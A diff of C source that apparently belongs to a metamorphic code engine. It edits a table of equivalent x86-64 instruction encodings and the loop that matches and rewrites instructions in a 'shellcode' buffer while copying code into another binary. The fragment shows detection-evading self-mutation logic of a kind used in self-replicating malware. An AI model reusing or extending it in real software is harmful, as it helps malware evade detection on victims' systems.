@@ -687,18 +687,18 @@ static void updateRegisters(unsigned char *ins, unsigned char *pointer, unsigned
   }
 }
 
-/* Source operand = 0b00000001 - Destination operand = 0b00000100 */
+/* Source operand = 0b001 - Destination operand = 0b100 */
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
-  /* "\x48\x89\xc0\x42\x00\x00\x21\x42", // MOV r/m64,r64 */
-  /* "\x48\x8d\xc0\x42\x00\x00\x9\x42", // LEA r/m64,r64 */
+  "\x48\x89\xc0\x42\x00\x00\x0c\x42", // MOV r/m64,r64
+  "\x48\x8d\x00\x42\x00\x00\x21\x42", // LEA r/m64,r64
+  "\x42",
   /* "\x50\x58\x90\x42\x04\x01\x00\x42", // PUSH r64, POP r64 */
   /* "\x91\x90\x48\x31\xdb\x90\x90\x42", // xor rbx ,rbx */
   /* "\xb8\x41\x00\x00\x00\x42", */
-  /* "\x42", */
-  "\x48\xc7\xc0\x00\x00\x00\x00\x42\x00\x00\x21\x00\x00\x00\x00\x42", // MOV r64, 0x0
-  "\x48\x31\xc0\x90\x90\x90\x90\x42\x00\x00\x09\x00\x00\x00\x00\x42", // XOR r64, r64
-  "\x90\x90\x48\x31\xc0\x90\x90\x42\x00\x00\x00\x00\x09\x00\x00\x42", // XOR r64, r64
-  "\x42"
+  /* "\x48\xc7\xc0\x00\x00\x00\x00\x42\x00\x00\x21\x00\x00\x00\x00\x42", // MOV r64, 0x0 */
+  /* "\x48\x31\xc0\x90\x90\x90\x90\x42\x00\x00\x09\x00\x00\x00\x00\x42", // XOR r64, r64 */
+  /* "\x90\x90\x48\x31\xc0\x90\x90\x42\x00\x00\x00\x00\x09\x00\x00\x42", // XOR r64, r64 */
+  /* "\x42" */
 };
 
 static void  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
@@ -718,7 +718,7 @@ static void  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
     ins = (void *)copyModifiedCode - sizeof(instructions);
     while (ins != (void *)copyModifiedCode) {
       j = 0;
-      while (ins[j] != 0x42 && (shellcode[i + j] == ins[j] || ins[j] == 0xc0))
+      while (ins[j] != 0x42 && (shellcode[i + j] == ins[j] || (ins[j] == 0xc0 && (shellcode[i + j] & 0x7) != 0x4 && (shellcode[i + j] & 0x7) != 0x5)))
         j += 1;
       if (ins[j] != 0x42 ||
   ((void *)(shellcode + i) >= (void *)copyModifiedCode - sizeof(instructions) && (void *)(shellcode + i) < (void *)copyModifiedCode)) {
@@ -727,7 +727,6 @@ static void  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
           ins += MAX_INS_SIZE;
         continue ;
       }
-      i += j;
       pointer = ins;
       while (ins[0] != 0x42 && ins != (void *)copyModifiedCode - sizeof(instructions))
         ins -= MAX_INS_SIZE;
@@ -750,7 +749,8 @@ static void  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
       binSize -= k;
       k += 1;
       pointer += k;
-      updateRegisters(ins + k, pointer, shellcode + i, bin, &binSize);
+      updateRegisters(pointer, ins + k, shellcode + i, bin, &binSize);
+      i += j;
       while (ins[0] != 0x42)
         ins += MAX_INS_SIZE;
       ins += MAX_INS_SIZE;
